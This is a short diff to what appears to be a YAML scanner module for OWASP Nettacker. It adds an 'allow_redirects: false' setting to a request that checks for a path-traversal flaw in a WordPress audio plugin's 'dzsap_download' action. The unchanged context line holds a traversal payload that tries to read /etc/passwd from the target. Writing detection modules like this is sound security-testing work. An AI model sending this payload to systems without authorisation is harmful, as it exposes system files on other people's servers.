@@ -28,6 +28,7 @@ payloads:
       - method: get
         headers:
           User-Agent: "{user_agent}"
+        allow_redirects: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd"
